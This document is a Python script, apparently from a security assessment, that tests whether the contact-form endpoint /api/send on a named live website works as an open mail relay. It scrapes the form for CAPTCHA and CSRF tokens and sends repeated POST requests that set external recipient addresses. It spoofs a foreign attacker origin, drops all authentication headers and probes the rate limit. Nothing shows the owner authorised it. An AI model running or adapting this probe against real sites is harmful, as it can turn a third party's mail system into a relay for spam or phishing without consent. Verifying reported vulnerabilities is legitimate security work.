#!/usr/bin/env python3
"""Independent verification of the /api/send open-relay claim on infinitycapital.bh."""
import json
import subprocess
import sys
import time

B = "https://www.infinitycapital.bh"
UA = "curl/8.5.0"
LOGP = "/work/evidence/relay_verify.log"
LOG = open(LOGP, "a")


def logit(*a):
    s = " ".join(str(x) for x in a)
    print(s)
    LOG.write(s + "\n")
    LOG.flush()


def post(form, origin=None, referer=None, ua=UA, label=""):
    body = "&".join("%s=%s" % (k, v.replace(" ", "%20").replace("@", "%40").replace("+", "%2B").replace("!", "%21"))
                    for k, v in form.items())
    cmd = ["curl", "-sk", "-X", "POST", "-A", ua, "-D", "/tmp/vr.h", "-o", "/tmp/vr.bin",
           "-w", "%{http_code}"]
    if origin:
        cmd += ["-H", "Origin: " + origin]
    if referer:
        cmd += ["-H", "Referer: " + referer]
    cmd += ["-H", "Content-Type: application/x-www-form-urlencoded",
            "--data-binary", body, B + "/api/send"]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
    code = (r.stdout or "").strip()
    raw = open("/tmp/vr.bin", "rb").read()
    hdr = open("/tmp/vr.h", "r", errors="replace").read()
    hdrs = [l for l in hdr.split("\n")
            if l.lower().startswith(("http/", "content-type", "x-matched", "x-vercel-id",
                                     "set-cookie", "x-robots", "server", "content-length"))]
    logit("\n--- %s ---" % label)
    logit("CMD: " + " ".join(cmd))
    logit("HDR: " + " | ".join(h.strip() for h in hdrs if h.strip()))
    logit("BODY: " + raw.decode("utf-8", "replace")[:600])
    return code, raw


def main():
    logit("\n########## INDEPENDENT VERIFICATION %s ##########" % time.strftime("%Y-%m-%d %H:%M:%S"))

    # 0. Does the contact form even name a client-controlled recipient field?
    logit("\n===== STEP 0: client-side form inspection =====")
    subprocess.run(["curl", "-sk", "-A", UA, "-o", "/tmp/contact.html", B + "/contact"], timeout=90)
    h = open("/tmp/contact.html", errors="replace").read()
    import re
    for m in re.finditer(r'<input[^>]*name=["\']?(\w+)[^>]*>', h, re.I):
        pass
    names = sorted(set(re.findall(r'name="([a-zA-Z_]+)"', h)))
    logit("contact.html input names: %s" % names)
    logit("has 'targets': %s" % ("targets" in names))
    for kw in ["captcha", "recaptcha", "turnstile", "hcaptcha", "csrf", "token"]:
        logit("contact.html mentions %-10s : %s" % (kw, kw.lower() in h.lower()))

    # 1. CONTROL: invalid recipient -> does server validate at all?
    f = {"fname": "Verifier", "lname": "Bot", "areacode": "973", "tel": "5551234",
         "cname": "QA Tester", "subject": "Verifier probe", "msg": "verifier body",
         "check": "on", "targets": "not-an-email"}
    post(f, origin=B, referer=B + "/contact", label="CONTROL invalid recipient targets=not-an-email")

    # 2. RELAY TEST: attacker-chosen external mailbox (bare address)
    f2 = dict(f); f2["targets"] = "verifier.probe@mailinator.com"
    post(f2, origin=B, referer=B + "/contact", label="RELAY-1 bare external targets=verifier.probe@mailinator.com")

    # 3. RELAY TEST: Name <addr> form
    f3 = dict(f); f3["targets"] = "QA Tester <verifier.probe@mailinator.com>"
    post(f3, origin=B, referer=B + "/contact", label="RELAY-2 Name<addr> external")

    # 4. NO AUTH AT ALL: strip Origin, Referer, cookies, use a bare client
    f4 = dict(f); f4["targets"] = "verifier.probe@mailinator.com"
    post(f4, origin=None, referer=None, ua="python-requests/2.32.0",
         label="RELAY-3 no Origin/Referer/cookie (zero-auth client)")

    # 5. Cross-origin: attacker page on a foreign origin
    f5 = dict(f); f5["targets"] = "verifier.probe@mailinator.com"
    post(f5, origin="https://evil.example.org", referer="https://evil.example.org/x.html",
         label="RELAY-4 foreign Origin/Referer (CSRF-style cross-origin POST)")

    # 6. Missing fields entirely -> is anything enforced?
    f6 = {"targets": "verifier.probe@mailinator.com"}
    post(f6, origin=B, referer=B + "/contact", label="RELAY-5 only 'targets' supplied, all other fields omitted")

    # 7. Quota / abuse-state observation
    logit("\n===== STEP 7: repeat unauthenticated sends to observe quota / rate state =====")
    for i in range(3):
        post(dict(f, targets="verifier.probe%d@mailinator.com" % i),
             origin=B, referer=B + "/contact", label="QUOTA-PROBE #%d" % (i + 1))
        time.sleep(3)


if __name__ == "__main__":
    main()
